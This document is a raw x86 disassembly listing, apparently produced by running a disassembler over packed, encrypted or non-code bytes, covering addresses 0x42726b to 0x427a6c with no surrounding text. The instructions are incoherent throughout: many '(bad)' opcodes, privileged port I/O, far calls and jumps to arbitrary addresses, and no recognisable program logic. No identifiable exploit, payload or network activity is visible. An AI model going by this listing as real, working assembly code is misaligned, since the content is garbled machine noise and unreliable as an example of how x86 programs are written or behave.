  42726b:	and    eax,0xfb5b3869
  427270:	loop   0x4272e3
  427272:	xchg   esi,eax
  427273:	in     eax,0xdf
  427275:	in     al,0x29
  427277:	ins    DWORD PTR es:[edi],dx
  427278:	mov    gs,WORD PTR [ebp-0x186cb87]
  42727e:	les    ebp,FWORD PTR [esi]
  427280:	cmc    
  427281:	xor    al,0x2d
  427283:	xchg   edx,eax
  427284:	pop    ebx
  427285:	mov    cl,0x9d
  427287:	xor    eax,0x275ff2a8
  42728c:	cmp    BYTE PTR [ecx-0x21],ch
  42728f:	cmp    eax,0xbf0afa9c
  427294:	add    ecx,0x1175298b
  42729a:	push   ds
  42729b:	mov    BYTE PTR [ebx+0x6f],0xa6
  42729f:	xor    al,0x41
  4272a1:	fs jmp 0x5584230f
  4272a7:	js     0x427291
  4272a9:	shl    BYTE PTR [ecx-0x5a],cl
  4272ac:	lods   al,BYTE PTR ds:[esi]
  4272ad:	push   esi
  4272ae:	add    cl,BYTE PTR [esi]
  4272b0:	inc    ecx
  4272b1:	mov    ebx,0x4df8adae
  4272b6:	add    cl,0xf5
  4272b9:	add    BYTE PTR [edx+0x76],dl
  4272bc:	retf   
  4272bd:	add    ebx,DWORD PTR [ebp+0x4a9453d6]
  4272c3:	dec    dx
  4272c5:	out    dx,al
  4272c6:	jo     0x4272c7
  4272c8:	sbb    DWORD PTR [ebx-0x7c],esi
  4272cb:	lods   eax,DWORD PTR ds:[esi]
  4272cc:	pop    eax
  4272cd:	sub    ch,ah
  4272cf:	mov    BYTE PTR ds:0xa75ac90e,bh
  4272d5:	bound  ecx,QWORD PTR [edx-0x63308c02]
  4272db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4272dc:	cdq    
  4272dd:	inc    ebp
  4272de:	inc    esi
  4272df:	or     eax,0x660a78a8
  4272e4:	lahf   
  4272e5:	dec    ebp
  4272e6:	rol    DWORD PTR [edi*8-0x4975ada4],0xd9
  4272ee:	push   ebp
  4272ef:	xchg   esi,eax
  4272f0:	ins    DWORD PTR es:[edi],dx
  4272f1:	jl     0x427324
  4272f3:	xchg   DWORD PTR [eax-0x6a],ecx
  4272f6:	pusha  
  4272f7:	repnz enter 0xb3ab,0x2c
  4272fc:	pop    edi
  4272fd:	jg     0x427328
  4272ff:	rol    BYTE PTR [ecx+0x72f4ad6b],0x50
  427306:	pop    ebx
  427307:	dec    esp
  427308:	call   DWORD PTR [esi-0x61]
  42730b:	and    BYTE PTR [edi-0x61],bh
  42730e:	test   al,0x48
  427310:	mov    ebx,0x7451f79a
  427315:	mov    dl,0xd0
  427317:	or     eax,0x90797a8c
  42731c:	jg     0x427346
  42731e:	mov    ah,0x31
  427320:	xchg   BYTE PTR ds:0x5b719271,ch
  427326:	aam    0x43
  427328:	and    eax,0xe4aa1e2b
  42732d:	sahf   
  42732e:	cs loop 0x42734c
  427331:	mov    cl,0x57
  427333:	loop   0x4272c1
  427335:	xor    eax,0x1146ccae
  42733a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42733b:	push   DWORD PTR [esi]
  42733d:	ds jns 0x4272cf
  427340:	and    eax,0xb9b4edf8
  427345:	sub    bl,BYTE PTR [edi+eiz*1+0x1c]
  427349:	adc    esp,esi
  42734b:	inc    edi
  42734c:	mov    eax,ds:0x80aeb1f9
  427351:	lds    ebp,FWORD PTR [ebx-0x8]
  427354:	inc    ecx
  427355:	sar    DWORD PTR [edx],cl
  427357:	pusha  
  427358:	stos   BYTE PTR es:[edi],al
  427359:	push   ebp
  42735a:	mov    edi,0xac3aadd2
  42735f:	push   edx
  427360:	push   0x78
  427362:	cmp    DWORD PTR [eax+eiz*4-0x68672750],0x4f991810
  42736d:	add    eax,0xffffff97
  427370:	mov    ch,0xe5
  427372:	cmp    BYTE PTR [esi-0x55],dh
  427375:	(bad)  
  427376:	mov    edi,0xb457f8d7
  42737b:	std    
  42737c:	out    0x23,eax
  42737e:	mov    ch,BYTE PTR [esi+0x68]
  427381:	jbe    0x4273fc
  427383:	xchg   edi,eax
  427384:	and    edx,esp
  427386:	mov    BYTE PTR [esi+0x71],dl
  427389:	add    dl,bl
  42738b:	addr16 sub eax,0xbaa67033
  427391:	in     al,0x88
  427393:	adc    bh,ah
  427395:	fstp   DWORD PTR [edi-0xbbb03b0]
  42739b:	test   eax,0x26c7d996
  4273a0:	pop    es
  4273a1:	sti    
  4273a2:	stos   BYTE PTR es:[edi],al
  4273a3:	inc    ecx
  4273a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273a5:	inc    esi
  4273a6:	test   BYTE PTR [ecx-0xce7d60b],dh
  4273ac:	or     BYTE PTR [ebp+0x823e153],dl
  4273b2:	mov    ebx,0x678982d8
  4273b7:	jg     0x4273e8
  4273b9:	loope  0x4273d2
  4273bb:	mov    al,BYTE PTR [edi]
  4273bd:	inc    esp
  4273be:	mov    edi,0x90112ad5
  4273c3:	sub    eax,0xa9d0311
  4273c8:	sbb    eax,0x3e99c30a
  4273cd:	out    dx,al
  4273ce:	outs   dx,DWORD PTR ds:[esi]
  4273cf:	and    al,0x1b
  4273d1:	lea    edi,[ebp-0x3a]
  4273d4:	mov    edx,0xbefbf4ec
  4273d9:	and    al,0xd2
  4273db:	mov    ebp,0xc0212049
  4273e0:	test   eax,0xfe0713bc
  4273e5:	xchg   DWORD PTR [esi-0x43],esp
  4273e8:	pop    ebx
  4273e9:	inc    esi
  4273ea:	jno    0x4273b6
  4273ec:	scas   al,BYTE PTR es:[edi]
  4273ed:	aad    0x4e
  4273ef:	or     al,0x22
  4273f1:	mov    esi,0x1c1e8d97
  4273f6:	cld    
  4273f7:	(bad)  
  4273f8:	iret   
  4273f9:	cmp    bl,al
  4273fb:	xor    ah,bh
  4273fd:	jmp    0x4273f1
  4273ff:	inc    edi
  427400:	aam    0x84
  427402:	xor    DWORD PTR [esi],esp
  427404:	jo     0x427473
  427406:	xor    BYTE PTR [ebp-0x7e30bb85],0xed
  42740d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42740e:	sub    ebp,DWORD PTR [edx+0x6e]
  427411:	ror    BYTE PTR [esi-0x23],cl
  427414:	shl    DWORD PTR [ecx],1
  427416:	ds dec ebx
  427418:	mov    ds:0x6fce7540,eax
  42741d:	(bad)  
  42741e:	js     0x42742f
  427420:	test   eax,0xc8fdb19
  427425:	hlt    
  427426:	aaa    
  427427:	nop
  427428:	jbe    0x427455
  42742a:	mov    ds:0xa34078d9,al
  42742f:	sbb    DWORD PTR [ecx-0x40e7013f],edi
  427435:	mov    ah,0xc9
  427437:	mov    dh,BYTE PTR [edi+0x1651509a]
  42743d:	dec    edi
  42743e:	aad    0xeb
  427440:	xor    ch,bl
  427442:	pusha  
  427443:	xor    eax,0xe270fddc
  427448:	inc    ebx
  427449:	lds    esp,FWORD PTR [edi+ebp*2]
  42744c:	ret    0x981f
  42744f:	sub    BYTE PTR [ebx+0x52],0x83
  427453:	int3   
  427454:	rol    BYTE PTR [edx-0x41],0x4a
  427458:	push   edx
  427459:	jge    0x4274cc
  42745b:	pop    ebx
  42745c:	ficomp DWORD PTR [eax]
  42745e:	add    eax,eax
  427460:	and    eax,DWORD PTR [edx-0x271804d9]
  427466:	fucomi st,st(6)
  427468:	or     eax,ebx
  42746a:	scas   eax,DWORD PTR es:[edi]
  42746b:	mov    dl,ah
  42746d:	pop    ebp
  42746e:	test   BYTE PTR [ecx+0x4e956ed8],dl
  427474:	aad    0x4e
  427476:	jmp    0xdad1bacc
  42747b:	jp     0x427447
  42747d:	cs inc ecx
  42747f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427480:	adc    BYTE PTR [eax],cl
  427482:	daa    
  427483:	(bad)  
  427484:	jo     0x427478
  427486:	mov    esp,0x51dc489a
  42748b:	aas    
  42748c:	lds    esi,FWORD PTR [edx+0x60]
  42748f:	inc    esp
  427490:	inc    edx
  427491:	inc    esi
  427492:	add    ebp,ecx
  427494:	jmp    0x3940b73b
  427499:	and    esp,ebp
  42749b:	adc    DWORD PTR [ecx-0x6],edi
  42749e:	pop    ecx
  42749f:	mov    eax,ds:0x343b0200
  4274a4:	fist   DWORD PTR [eax+0x7b]
  4274a7:	dec    edi
  4274a8:	scas   al,BYTE PTR es:[edi]
  4274a9:	ins    BYTE PTR es:[edi],dx
  4274aa:	xlat   BYTE PTR ds:[ebx]
  4274ab:	loopne 0x42748e
  4274ad:	rcr    BYTE PTR [edx-0x3eb0936b],0x1
  4274b4:	push   ds
  4274b5:	xchg   ebx,eax
  4274b6:	jns    0x427487
  4274b8:	stc    
  4274b9:	mov    ch,0x7
  4274bb:	mov    es,WORD PTR ds:0x42f9e560
  4274c1:	jl     0x427526
  4274c3:	mov    ch,0x17
  4274c5:	test   BYTE PTR [edx],ah
  4274c7:	push   cs
  4274c8:	add    eax,0x8364c2a5
  4274cd:	xor    eax,0x179cfb4d
  4274d2:	test   BYTE PTR [ecx-0x4b],ah
  4274d5:	fld    TBYTE PTR [ecx+0x46]
  4274d8:	test   DWORD PTR [eax],0x3590000
  4274de:	rol    DWORD PTR [ebx+ebx*8-0x3a],0xdd
  4274e3:	pop    ds
  4274e4:	sub    ebp,DWORD PTR [esi-0x4aecc146]
  4274ea:	or     DWORD PTR ds:0x1ec8b,edi
  4274f0:	test   DWORD PTR [edx],eax
  4274f2:	add    BYTE PTR [eax],al
  4274f4:	or     DWORD PTR [ecx+0x7587083c],0x7c
  4274fb:	cmp    ebp,DWORD PTR [edx]
  4274fd:	xchg   edx,eax
  4274fe:	mov    esi,0xe53db8f7
  427503:	fisttp WORD PTR [edx]
  427505:	int    0x22
  427507:	dec    eax
  427508:	inc    ebx
  427509:	pop    eax
  42750a:	lods   eax,DWORD PTR ds:[esi]
  42750b:	aas    
  42750c:	jbe    0x42749b
  42750e:	cmp    dh,0xde
  427511:	ds in  al,0xe9
  427514:	push   ecx
  427515:	dec    ebx
  427516:	das    
  427517:	cs retf 0xbb7c
  42751b:	add    al,0x80
  42751d:	mov    esp,0x2a43ed11
  427522:	fwait
  427523:	xor    eax,0x1ccef1f3
  427528:	mov    ebx,0x26ca6edc
  42752d:	jbe    0x42752c
  42752f:	pop    eax
  427530:	arpl   di,ax
  427532:	mov    ah,0x6a
  427534:	in     al,0xc6
  427536:	in     al,dx
  427537:	out    dx,al
  427538:	fwait
  427539:	in     eax,0xa
  42753b:	(bad)  
  42753c:	sbb    eax,0x855efa88
  427541:	ins    DWORD PTR es:[edi],dx
  427542:	std    
  427543:	arpl   WORD PTR [ebx+0x6d9bc929],sp
  427549:	xor    eax,0x16e418d
  42754e:	out    0xa4,eax
  427550:	imul   esp,DWORD PTR [edi+esi*8+0x34518e72],0x73674e13
  42755b:	jne    0x427572
  42755d:	and    esi,eax
  42755f:	rcr    BYTE PTR [esi+eiz*4],0xab
  427563:	ins    DWORD PTR es:[edi],dx
  427564:	jle    0x427599
  427566:	sbb    DWORD PTR [eax*8+0xfdcb536],esi
  42756d:	fsubr  DWORD PTR [ebx]
  42756f:	lea    eax,[ebp-0x10b2516f]
  427575:	inc    esi
  427576:	push   0x2984f56b
  42757b:	dec    ebx
  42757c:	shr    DWORD PTR [ebx-0x18],1
  42757f:	push   eax
  427580:	push   eax
  427581:	rcl    DWORD PTR [ebx+ebx*8-0x4a346205],cl
  427588:	lds    edx,FWORD PTR [edi+esi*1]
  42758b:	xor    eax,0x66cd36c7
  427590:	pop    edx
  427591:	mov    ah,0xde
  427593:	pop    esp
  427594:	inc    ecx
  427595:	(bad)  
  427596:	push   edi
  427597:	pop    edi
  427598:	call   0xce5c:0xbc22ffe2
  42759f:	mov    BYTE PTR ds:0xe9e8f740,cl
  4275a5:	and    edi,eax
  4275a7:	push   esp
  4275a8:	sub    esp,DWORD PTR [ecx]
  4275aa:	sbb    bl,BYTE PTR [eax]
  4275ac:	cs jmp 0x7aacb4c9
  4275b2:	xor    cl,ah
  4275b4:	xor    al,0xfa
  4275b6:	lock mov fs,WORD PTR [eax-0x79]
  4275ba:	jae    0x4275c0
  4275bc:	daa    
  4275bd:	dec    ecx
  4275be:	mov    ah,0xe4
  4275c0:	pop    eax
  4275c1:	mov    ch,0x5c
  4275c3:	mov    bh,0x4f
  4275c5:	(bad)  
  4275c6:	mov    ah,al
  4275c8:	pop    ss
  4275c9:	ja     0x42757f
  4275cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275cc:	xor    cl,ah
  4275ce:	data16 mov ah,0x85
  4275d1:	pop    eax
  4275d2:	stc    
  4275d3:	mov    edi,0x7938e8eb
  4275d8:	fst    QWORD PTR [ecx]
  4275da:	cld    
  4275db:	lds    esp,FWORD PTR [edx+0x3]
  4275de:	sahf   
  4275df:	sbb    BYTE PTR [eax+0x5c4af00],ch
  4275e5:	data16 mov BYTE PTR [edi+0x437cfdb],ch
  4275ec:	cs ret 
  4275ee:	mov    WORD PTR [eax],gs
  4275f0:	pop    si
  4275f2:	pop    esp
  4275f3:	(bad)  
  4275f4:	out    0xc8,al
  4275f6:	mov    bl,0x3f
  4275f8:	and    BYTE PTR [eax+0x69],bh
  4275fb:	dec    edi
  4275fc:	jo     0x4275d8
  4275fe:	outs   dx,DWORD PTR ds:[esi]
  4275ff:	and    bh,ch
  427601:	repz inc ebp
  427603:	pop    edi
  427604:	test   ebx,0x355a22bf
  42760a:	fs mov ah,0x68
  42760d:	jmp    0x5f99216d
  427612:	mov    bh,0x34
  427614:	jge    0x4275e2
  427616:	dec    ebx
  427617:	mov    cl,dh
  427619:	jl     0x427693
  42761b:	test   eax,0xafc8ef9a
  427620:	inc    ebx
  427621:	xor    DWORD PTR [edx+eax*8+0x480b49d6],esi
  427628:	imul   ebx,DWORD PTR [eax-0x4596b3d0],0x7
  42762f:	inc    edx
  427630:	jb     0x4275db
  427632:	(bad)  
  427633:	mov    DWORD PTR ss:0xcd8e1fbb,esi
  42763a:	xchg   DWORD PTR [eax-0x492fe5b8],esp
  427640:	push   ebp
  427641:	mov    bl,0x43
  427643:	inc    ebp
  427644:	xor    DWORD PTR ds:[ebx],0xd8013fab
  42764b:	pop    ds
  42764c:	push   DWORD PTR [ebx]
  42764e:	mov    esp,0x1d69e266
  427653:	dec    ebp
  427654:	retf   0x6867
  427657:	xlat   BYTE PTR ds:[ebx]
  427658:	int3   
  427659:	xchg   edx,eax
  42765a:	sub    BYTE PTR gs:[edi],ch
  42765d:	lds    esp,FWORD PTR [edx]
  42765f:	into   
  427660:	dec    edx
  427661:	push   cs
  427662:	in     al,0xf8
  427664:	mov    al,0xe6
  427666:	in     eax,0x57
  427668:	mov    DWORD PTR [ebp+0x5b075e5a],edi
  42766e:	cmp    bl,BYTE PTR [ebp+0x14]
  427671:	xchg   edx,eax
  427672:	test   BYTE PTR ds:0xdd837781,bl
  427678:	icebp  
  427679:	das    
  42767a:	rcr    BYTE PTR [ebx],1
  42767c:	test   eax,0xde3e26f0
  427681:	lods   eax,DWORD PTR ds:[esi]
  427682:	fiadd  WORD PTR [esi*1-0x2b83f2e8]
  427689:	cmp    eax,0x4076475b
  42768e:	or     DWORD PTR [edi+0x28],esi
  427691:	push   ds
  427692:	xchg   esp,eax
  427693:	push   esp
  427694:	jle    0x4276df
  427696:	jne    0x427709
  427698:	sbb    eax,eax
  42769a:	jo     0x4276f8
  42769c:	test   eax,0xc08809e8
  4276a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a2:	push   edx
  4276a3:	(bad)  
  4276a4:	int3   
  4276a5:	pop    ecx
  4276a6:	add    DWORD PTR [edx-0x1],eax
  4276a9:	and    eax,0xb30c19f3
  4276ae:	rol    DWORD PTR [edi],1
  4276b0:	adc    esi,DWORD PTR [esi+0x20]
  4276b3:	cmp    dh,dh
  4276b5:	lock mov eax,0x77ce39b1
  4276bb:	jae    0x427701
  4276bd:	sti    
  4276be:	add    bl,BYTE PTR [esi+0x6e1be137]
  4276c4:	(bad)  [esi+0x48481d8d]
  4276ca:	xchg   ebx,eax
  4276cb:	call   0x1342:0x60ca38a7
  4276d2:	repnz popw es
  4276d5:	add    BYTE PTR [edx],al
  4276d7:	xor    al,0x2
  4276d9:	das    
  4276da:	mov    ch,0x1d
  4276dc:	push   ebx
  4276dd:	jle    0x42766e
  4276df:	mov    DWORD PTR [esi],ecx
  4276e1:	add    esp,ecx
  4276e3:	add    esi,ebx
  4276e5:	aam    0x58
  4276e7:	jae    0x4276ee
  4276e9:	add    eax,0x4b5c6c07
  4276ee:	aas    
  4276ef:	push   ebx
  4276f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276f1:	mov    eax,0x588eb49f
  4276f6:	aaa    
  4276f7:	(bad)  [esi-0x16]
  4276fa:	xor    eax,0x6f3f3c73
  4276ff:	jmp    0xea927f2e
  427704:	mov    eax,ds:0xb357f698
  427709:	iret   
  42770a:	jg     0x4276d5
  42770c:	stos   BYTE PTR es:[edi],al
  42770d:	cmc    
  42770e:	shr    DWORD PTR [edx+eiz*2+0x3c0b8da],0x19
  427716:	sbb    DWORD PTR [edi+0x7],ebx
  427719:	inc    edx
  42771a:	ret    0xadd5
  42771d:	stos   DWORD PTR es:[edi],eax
  42771e:	adc    eax,0xcc49e027
  427723:	xor    ecx,DWORD PTR [edi]
  427725:	addr16 jne 0x4276d8
  427728:	or     DWORD PTR [ebp+esi*4-0x6f],0xffffffe2
  42772d:	aaa    
  42772e:	or     edi,DWORD PTR [eax-0x40388c0b]
  427734:	sbb    eax,DWORD PTR [edi-0x58]
  427737:	fsub   st,st(1)
  427739:	cmc    
  42773a:	adc    BYTE PTR [esi-0x76548b87],cl
  427740:	push   es
  427741:	inc    ebx
  427742:	mov    es,WORD PTR [ecx+0x384b6202]
  427748:	mov    al,0x75
  42774a:	in     eax,0xe3
  42774c:	jns    0x4276d0
  42774e:	(bad)  
  42774f:	mov    edx,0x4b3d4429
  427754:	aam    0x86
  427756:	fcom   QWORD PTR [edx-0x77b20406]
  42775c:	ss fwait
  42775e:	in     al,dx
  42775f:	sbb    bh,cl
  427761:	aas    
  427762:	dec    esi
  427763:	sbb    DWORD PTR [eax-0x700f3939],0xe6b1aa3e
  42776d:	call   0x66e155e9
  427772:	pop    esi
  427773:	fs push edx
  427775:	aas    
  427776:	mov    edx,ebx
  427778:	enter  0x0,0x0
  42777c:	sbb    esp,DWORD PTR [edi]
  42777e:	pushf  
  42777f:	cli    
  427780:	mov    esp,0x2ae77ffb
  427785:	scas   al,BYTE PTR es:[edi]
  427786:	aad    0xf
  427788:	push   ds
  427789:	in     eax,dx
  42778a:	fcmovbe st,st(3)
  42778c:	adc    bh,ch
  42778e:	add    DWORD PTR [eax],eax
  427790:	test   DWORD PTR [edx],eax
  427792:	add    BYTE PTR [eax],al
  427794:	sub    BYTE PTR [ebx+0x1b988b74],dl
  42779a:	aas    
  42779b:	cwde   
  42779c:	(bad)  
  42779d:	sar    DWORD PTR [esi],cl
  42779f:	cmp    eax,ebp
  4277a1:	fsubr  st(3),st
  4277a3:	mov    esp,0x6f62793d
  4277a8:	add    DWORD PTR [eax+0x2c],ecx
  4277ab:	pop    ss
  4277ac:	aad    0x1
  4277ae:	add    esp,edx
  4277b0:	rcr    BYTE PTR [edx+0x20],0x91
  4277b4:	loope  0x4277f4
  4277b6:	stos   BYTE PTR es:[edi],al
  4277b7:	inc    edi
  4277b8:	repnz (bad) 
  4277ba:	jb     0x4277b9
  4277bc:	xchg   esi,eax
  4277bd:	mov    ch,0xfd
  4277bf:	rcr    BYTE PTR [ebp+0xd],cl
  4277c2:	xor    ch,BYTE PTR [edx-0xc]
  4277c5:	pusha  
  4277c6:	jns    0x4277ee
  4277c8:	sbb    ch,BYTE PTR [edi]
  4277ca:	shl    DWORD PTR [esp+esi*8],1
  4277cd:	and    BYTE PTR [ebx+0x7ef3dc23],al
  4277d3:	(bad)  
  4277d4:	outs   dx,DWORD PTR ds:[esi]
  4277d5:	je     0x42781a
  4277d7:	jp     0x427782
  4277d9:	ins    BYTE PTR es:[edi],dx
  4277da:	push   esi
  4277db:	ds repnz (bad) 
  4277de:	aas    
  4277df:	jbe    0x427798
  4277e1:	rcr    BYTE PTR [esi],cl
  4277e3:	xor    esp,DWORD PTR [edx]
  4277e5:	adc    esi,DWORD PTR [edx]
  4277e7:	push   ecx
  4277e8:	xchg   BYTE PTR ds:0x2c4f6add,cl
  4277ee:	and    BYTE PTR [ebp+0x21],bl
  4277f1:	fldcw  WORD PTR [esi]
  4277f3:	cld    
  4277f4:	push   es
  4277f5:	popf   
  4277f6:	stos   BYTE PTR es:[edi],al
  4277f7:	xor    al,0x57
  4277f9:	daa    
  4277fa:	test   DWORD PTR [edx+0x26b14f61],0x662a7077
  427804:	add    esp,DWORD PTR [eax+0x10]
  427807:	sub    edx,DWORD PTR [edi+0x72]
  42780a:	pop    ss
  42780b:	inc    ecx
  42780c:	inc    eax
  42780d:	fdivr  QWORD PTR [ebx-0x41495994]
  427813:	out    0x34,al
  427815:	daa    
  427816:	jge    0x427798
  427818:	dec    ecx
  427819:	mov    cl,0x32
  42781b:	bound  ecx,QWORD PTR [edx]
  42781d:	fwait
  42781e:	addr16 pop ds
  427820:	and    esi,esi
  427822:	sar    BYTE PTR [ecx-0x6f],0x8f
  427826:	mov    ah,0x9a
  427828:	dec    esp
  427829:	in     eax,dx
  42782a:	xchg   ebx,eax
  42782b:	arpl   dx,si
  42782d:	mov    ch,0x5e
  42782f:	or     esi,DWORD PTR [ecx]
  427831:	sbb    BYTE PTR [ecx],dl
  427833:	into   
  427834:	neg    BYTE PTR [ebx-0x101c9f9e]
  42783a:	repz call FWORD PTR [ebx-0x4a]
  42783e:	sub    al,0xaf
  427840:	xchg   edx,eax
  427841:	idiv   BYTE PTR [eax+0x7f]
  427844:	adc    DWORD PTR [ebp+eax*8-0x79],ebx
  427848:	or     eax,0x420a546a
  42784d:	pop    es
  42784e:	hlt    
  42784f:	or     DWORD PTR [esi+ebp*1+0x2d],eax
  427853:	test   eax,0xcdbc5d9e
  427858:	arpl   WORD PTR [edx+0x48],dx
  42785b:	das    
  42785c:	pop    edx
  42785d:	sub    al,0x59
  42785f:	mov    edi,0x9356a984
  427864:	fisubr DWORD PTR [eax+0x23445d39]
  42786a:	pop    esp
  42786b:	sbb    BYTE PTR [esi+0x5601dfce],cl
  427871:	fsubr  DWORD PTR [ebp-0x76]
  427874:	(bad)  
  427875:	cmp    DWORD PTR [ecx],esp
  427877:	mov    bh,bh
  427879:	jl     0x4278ee
  42787b:	fldcw  WORD PTR [ebx+0x21]
  42787e:	lea    esi,[ebx+ebx*2+0x5aff0ba9]
  427885:	xchg   esi,eax
  427886:	loop   0x427880
  427888:	add    BYTE PTR [ebx-0x2caa5729],bl
  42788e:	sub    BYTE PTR [ecx-0x733ae622],dl
  427894:	test   eax,0x224ce723
  427899:	dec    ebx
  42789a:	mov    ebx,db0
  42789d:	or     edi,esi
  42789f:	fcmovnu st,st(1)
  4278a1:	dec    ebx
  4278a2:	je     0x4278c2
  4278a4:	cdq    
  4278a5:	test   eax,0x9ad53a7a
  4278aa:	push   0x6b
  4278ac:	shl    DWORD PTR [ebp+0x624bc8c4],1
  4278b2:	and    al,0x29
  4278b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278b5:	push   esp
  4278b6:	cld    
  4278b7:	jae    0x4278a6
  4278b9:	sahf   
  4278ba:	cld    
  4278bb:	repnz cmp BYTE PTR [edi+ebp*1+0x32686078],bl
  4278c3:	mov    BYTE PTR [ebx+edi*8],dh
  4278c6:	je     0x427889
  4278c8:	xor    esi,0x2beed
  4278ce:	out    0x2d,al
  4278d0:	stos   DWORD PTR es:[edi],eax
  4278d1:	call   0x2b8d844a
  4278d6:	sub    eax,0xe3440337
  4278db:	ret    0x5a9b
  4278de:	adc    BYTE PTR [esi],bh
  4278e0:	ret    
  4278e1:	xor    DWORD PTR [esi],eax
  4278e3:	test   DWORD PTR [ecx],0x3628780a
  4278e9:	push   esi
  4278ea:	inc    edi
  4278eb:	mov    BYTE PTR [ebx],bl
  4278ed:	sub    BYTE PTR [edx+0x53948d5],dl
  4278f3:	sbb    ecx,edi
  4278f5:	dec    ebp
  4278f6:	fs es mov esp,0x7f847fa1
  4278fd:	ss cmp al,0xf
  427900:	cmp    DWORD PTR [edx],0x79
  427903:	xchg   esi,eax
  427904:	stos   DWORD PTR es:[di],eax
  427906:	lods   al,BYTE PTR ds:[esi]
  427907:	add    eax,0x2bd283ad
  42790c:	push   esi
  42790d:	push   ecx
  42790e:	das    
  42790f:	jle    0x4278b5
  427911:	repnz and bl,BYTE PTR [ebp-0x8]
  427915:	jo     0x4278f7
  427917:	pop    edx
  427918:	mov    eax,0x9c3f768b
  42791d:	icebp  
  42791e:	es je  0x4278ef
  427921:	xor    al,cl
  427923:	mov    ebp,0x419893e
  427928:	icebp  
  427929:	shr    al,1
  42792b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42792c:	dec    eax
  42792d:	sub    cl,BYTE PTR [eax+0xf]
  427930:	pop    ebp
  427931:	shl    DWORD PTR [edx+0x76],cl
  427934:	imul   edx,eax,0x10
  427937:	xchg   esp,eax
  427938:	mov    al,ds:0x20167743
  42793d:	nop
  42793e:	or     DWORD PTR ds:0x2cdb34de,ebx
  427944:	mov    esi,0xfff3a737
  427949:	dec    edx
  42794a:	adc    al,0xb8
  42794c:	in     eax,dx
  42794d:	dec    eax
  42794e:	lock fsubrp st(4),st
  427951:	adc    DWORD PTR [eax-0x7fec7519],ecx
  427957:	lock cld 
  427959:	fist   DWORD PTR [ebp-0x3e787a6c]
  42795f:	jmp    0x4279a3
  427961:	in     eax,dx
  427962:	shl    BYTE PTR [ecx+0x45e30799],0x14
  427969:	inc    ebp
  42796a:	in     al,0x48
  42796c:	sub    eax,0x61dcd6cc
  427971:	sub    edi,DWORD PTR [ecx+0x50]
  427974:	fucomi st,st(0)
  427976:	xchg   BYTE PTR [edx+0x18e8f87e],dh
  42797c:	sbb    ebx,DWORD PTR [eax+ebx*4]
  42797f:	aam    0x64
  427981:	(bad)  
  427982:	and    al,0x2b
  427984:	mov    al,ds:0x8d027e97
  427989:	test   BYTE PTR [edi+ecx*4],0xb6
  42798d:	push   edi
  42798e:	mov    eax,0x4f544c49
  427993:	jmp    0x4d4de724
  427998:	add    BYTE PTR [edx-0x23700dc1],dl
  42799e:	inc    edx
  42799f:	or     BYTE PTR [ebx*1-0x3a87ab91],dh
  4279a6:	or     BYTE PTR [edx],ch
  4279a8:	test   bl,ch
  4279aa:	add    ebp,DWORD PTR [edi]
  4279ac:	pop    esp
  4279ad:	inc    esp
  4279ae:	xchg   ecx,eax
  4279af:	and    bl,dh
  4279b1:	add    BYTE PTR ds:0x8c4b27db,dh
  4279b7:	adc    dh,al
  4279b9:	mov    bh,0x9d
  4279bb:	stos   DWORD PTR es:[edi],eax
  4279bc:	loop   0x4279c4
  4279be:	xchg   esp,eax
  4279bf:	pop    ebx
  4279c0:	ins    BYTE PTR es:[edi],dx
  4279c1:	adc    DWORD PTR [esi-0x26052d65],edx
  4279c7:	mov    cl,0x7f
  4279c9:	in     al,dx
  4279ca:	fstp   TBYTE PTR [eax+0xd982568]
  4279d0:	and    BYTE PTR [edi-0x46],ch
  4279d3:	mul    DWORD PTR [ebx+0x59e0a7cf]
  4279d9:	or     ch,BYTE PTR ds:0xa8690b99
  4279df:	pop    ds
  4279e0:	push   ebx
  4279e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279e2:	push   ebx
  4279e3:	test   al,0x4
  4279e5:	bound  edx,QWORD PTR [eax+0x17bb8f02]
  4279eb:	ret    
  4279ec:	inc    ebp
  4279ed:	dec    edx
  4279ee:	xlat   BYTE PTR ds:[ebx]
  4279ef:	pushf  
  4279f0:	jg     0x427a0b
  4279f2:	xchg   edx,eax
  4279f3:	lahf   
  4279f4:	jl     0x427a1f
  4279f6:	push   edx
  4279f7:	mov    bl,0x71
  4279f9:	(bad)  
  4279fa:	jnp    0x4279e7
  4279fc:	pop    edx
  4279fd:	xchg   ecx,eax
  4279fe:	retf   0xfc4f
  427a01:	sar    DWORD PTR [ebp-0x69e5b795],0x79
  427a08:	pop    ss
  427a09:	xchg   esi,eax
  427a0a:	mov    bl,0x7f
  427a0c:	int3   
  427a0d:	dec    ebx
  427a0e:	push   0x99521296
  427a13:	retf   
  427a14:	(bad)  
  427a15:	retf   
  427a16:	mov    eax,0xde93
  427a1b:	add    BYTE PTR [edx-0x107ddbc],bl
  427a21:	(bad)  
  427a22:	fisub  DWORD PTR [esi+0x62]
  427a25:	mov    eax,0x88337475
  427a2a:	idiv   esp
  427a2c:	xchg   ebp,eax
  427a2d:	icebp  
  427a2e:	add    DWORD PTR [eax],eax
  427a30:	test   DWORD PTR [edx],eax
  427a32:	add    BYTE PTR [eax],al
  427a34:	into   
  427a35:	fld    QWORD PTR [edi-0x7ba123c7]
  427a3b:	mov    edi,0x71a96be1
  427a40:	sub    eax,0x2d4a7579
  427a45:	int    0x50
  427a47:	dec    ebx
  427a48:	int    0xa
  427a4a:	and    BYTE PTR [ebx-0x66],dl
  427a4d:	int3   
  427a4e:	sub    eax,0x7f659613
  427a53:	cdq    
  427a54:	lea    ebp,[esp+edi*4-0x9]
  427a58:	or     bh,BYTE PTR [edi-0x5e]
  427a5b:	sti    
  427a5c:	dec    ebp
  427a5d:	mov    ebx,0xaaa2aee4
  427a62:	lods   eax,DWORD PTR ds:[esi]
  427a63:	adc    al,0x66
  427a65:	cmc    
  427a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a67:	adc    eax,0xd5dd4810
  427a6c:	fistp  DWORD PTR [edi-0x71]
